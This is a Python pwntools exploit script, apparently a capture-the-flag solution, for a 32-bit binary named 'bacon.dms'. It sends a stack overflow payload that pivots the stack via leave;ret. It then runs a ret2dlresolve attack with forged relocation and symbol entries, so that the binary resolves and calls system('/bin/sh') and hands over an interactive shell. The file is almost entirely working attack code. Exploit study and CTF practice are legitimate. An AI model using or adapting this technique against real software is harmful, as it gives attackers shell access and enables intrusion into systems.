from pwn import *

elf = ELF('./bacon.dms')

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    # host = 'jh2i.com'
    # port = 50032
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x8049292
c
'''.format(**locals())


io = start()

# objdump -M intel -d bacon.dms -x


'''
08049040 <read@plt>:
 8049040:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
 8049046:       68 00 00 00 00          push   0x0
 804904b:       e9 e0 ff ff ff          jmp    8049030 <read@plt-0x10>
'''
# All got starts with 0x804c
# arbitrary rw location to store payload
buf = 0x804ca00

# Easy to find
leave_ret = 0x08049126

PLT = elf.get_section_by_name('.plt')['sh_addr']
STRTAB, SYMTAB, JMPREL = map(elf.dynamic_value_by_tag, ['DT_STRTAB', 'DT_SYMTAB', 'DT_JMPREL'])

'''
# Sections
# 11 .plt          00000070  08049030  08049030  00001030  2**4
PLT = 0x8049030

# Dynamic Section
SYMTAB = 0x804820c
STRTAB = 0x80482ec
JMPREL = 0x8048408
'''

# 0x40c for EIP, 0x408 for saved ebp
# First Read
buffer1 = ''
buffer1 += 'A'*0x408
buffer1 += p32(buf)
buffer1 += p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80) + 'AAAAAAAAAAAA'
# 0x42c, which is the 3rd argument of read
print(hex(len(buffer1)))
log.info('Read@plt: {}'.format(hex(elf.plt['read'])))

forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10)

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) // 0x10

r_info = (index_sym << 8) | 0x7

elf32_rel = p32(elf.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)

# Second Read
buffer2 = 'AAAA'
buffer2 += p32(PLT)
buffer2 += p32(rel_offset)
buffer2 += 'AAAA'
buffer2 += p32(buf+100)
buffer2 += elf32_rel
buffer2 += 'A' * align
buffer2 += elf32_sym_struct
buffer2 += 'system\x00'
p = (100 - len(buffer2))
buffer2 += 'A' * p
buffer2 += '/bin/sh\x00'
p = (0x80 - len(buffer2))
buffer2 += 'A' * p
print(hex(len(buffer2)))
#pause()
io.send(buffer1+buffer2)
#io.send(buffer2)
io.interactive()